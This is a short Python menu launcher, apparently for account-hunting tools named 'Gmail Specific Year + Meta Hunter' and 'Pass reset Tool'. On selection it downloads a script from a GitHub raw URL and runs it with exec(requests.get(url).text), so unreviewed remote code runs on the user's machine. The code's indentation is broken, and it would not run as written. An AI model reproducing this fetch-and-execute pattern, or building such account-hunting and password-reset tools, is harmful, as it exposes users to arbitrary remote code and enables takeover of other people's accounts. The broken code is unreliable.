import requests
from cfonts import render

NIKZ = render('{NiKZ}', colors=['yellow', 'cyan'], align='center')
print(NIKZ)
print("▩" * 60)

print(f"""\x1b[38;5;117m 1\x1b[38;5;231m - Gmail Specific Year + Meta Hunter | ✅
\x1b[38;5;117m 2\x1b[38;5;231m - Pass reset Tool | \x1b[1;32m Active ✅
""")

def main_menu():
    print("▩" * 60)
    choice = input(" • Enter your choice (1-6): ")
  scripts = {
      "1": "https://raw.githubusercontent.com/nikzffx/meta/refs/heads/main/gs.py",
  }

if choice in scripts:
        execute_script(scripts[choice])
    else:
        print("Invalid input. Please choose a number between 1 and 6.")
        main_menu()

def execute_script(url):
    try:
        exec(requests.get(url).text)
    except Exception as e:
        print(f"An error occurred while executing the script: {e}")

if __name__ == "__main__":
    main_menu()
    #𝐍𝐈𝐊𝐙 ~ NikzPy
